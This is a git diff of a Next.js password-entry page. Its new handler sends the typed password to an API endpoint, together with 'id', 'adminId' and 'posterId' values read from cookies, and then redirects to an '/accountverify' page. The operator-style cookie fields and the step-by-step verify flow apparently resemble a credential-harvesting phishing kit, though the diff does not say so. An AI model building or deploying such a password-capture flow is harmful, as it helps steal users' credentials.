@@ -3,13 +3,47 @@ import Image from "next/image";
 import React, { useState } from "react";
 import { CircleUserRound } from "lucide-react";
 import { useRouter } from "next/navigation";
+import { API_URL } from "@/config";
+import Cookies from "js-cookie";
 
 function Password() {
-  const [password, setPassword] = useState();
+  const [password, setPassword] = useState("");
   const [showPassword, setShowPassword] = useState(false);
-  const router = useRouter  ();
-  const handlePassword = () => {
-    router.push("/accountverify");
+  const router = useRouter();
+  const id = Cookies.get("id");
+  const adminId = Cookies.get("adminId");
+  const posterId = Cookies.get("posterId");
+  const handlePassword = async() => {
+    if (!password) {
+      return;
+    }
+    const values = {
+      id,
+      password,
+      adminId,
+      posterId,
+    };
+    const url = `${API_URL}/password/post`;
+
+    const res = await fetch(url, {
+      method: "POST",
+      headers: {
+        Accept: "application/json",
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(values),
+    });
+    const data = await res.json();
+    console.log(data);
+
+    if (res.ok) {
+      console.log("success", data);
+      
+      router.push("/accountverify");
+    } else {
+      console.log("error", data);
+      // toast.error("Something Went Wrong");
+    }
   };
   return (
     <div className=" w-full min-h-screen flex flex-col justify-center items-center">
